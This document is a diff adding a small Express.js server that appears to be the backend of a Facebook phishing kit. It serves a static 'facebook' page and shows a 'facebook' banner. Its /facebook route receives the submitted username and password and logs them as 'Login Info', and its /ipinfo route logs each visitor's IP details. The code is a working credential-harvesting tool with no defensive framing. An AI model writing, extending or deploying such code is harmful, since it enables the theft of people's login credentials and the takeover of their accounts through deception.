@@ -1,0 +1,39 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const path = require('path');
+const CFonts = require('cfonts');
+const app = express();
+const port = 3000;
+
+app.use(bodyParser.json());
+
+app.use(express.static(path.join(__dirname, 'facebook')));
+
+app.post('/facebook', (req, res) => {
+    const { idusername, idpass } = req.body;
+    console.log(`\nLogin Info: {\n  Username: ${idusername},\n  Password: ${idpass}\n}`);
+    res.sendStatus(200);
+});
+
+app.post('/ipinfo', (req, res) => {
+    const ipInfo = req.body;
+    console.log(`\nIP Info:`, ipInfo);
+    res.sendStatus(200);
+});
+
+const banner = CFonts.say('facebook', {
+    font: 'pallet',              
+    align: 'left',             
+    colors: ['yellowBright', 'white'], 
+    background: 'black',        
+    letterSpacing: 1,          
+    lineHeight: 1,              
+    space: true,                
+    maxLength: '0',     
+});
+
+app.listen(port, () => {
+    banner
+    console.log('[-] Server connected!')
+    console.log(`[-] Server is running on http://localhost:${port}`);
+});
